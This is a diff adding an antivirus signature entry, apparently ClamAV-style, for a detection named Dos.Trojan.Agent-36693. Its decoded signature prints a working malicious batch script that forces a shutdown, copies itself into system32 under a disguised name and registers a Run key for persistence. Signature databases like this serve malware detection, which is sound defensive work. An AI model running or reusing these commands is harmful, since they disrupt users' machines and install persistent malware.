@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36693
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off shutdown -s -t 1 -c "lol" -f >nul copy ""%0"" "%systemroot%\system32\...bat" >nul reg add "hklm\software\microsoft\windows\currentversion\ru n" /v "..." /t reg_sz /d "%systemroot%\system32\...bat" /f >nul
